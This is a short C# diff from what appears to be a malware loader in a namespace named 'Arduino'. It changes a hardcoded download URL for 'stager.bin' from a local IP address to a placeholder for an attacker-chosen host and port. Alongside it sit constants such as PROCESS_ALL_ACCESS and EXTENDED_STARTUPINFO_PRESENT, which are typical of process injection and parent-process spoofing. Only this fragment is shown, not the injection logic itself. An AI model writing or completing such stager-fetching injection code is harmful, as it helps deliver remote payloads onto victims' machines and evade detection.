@@ -7,7 +7,7 @@ namespace Arduino
 {
     public class Program
     {
-        private static string url = "http://192.168.1.126:8000/stager.bin";
+        private static string url = "http://<IP and Port of your choosing>/stager.bin";
         #region Constants
         const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
         const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
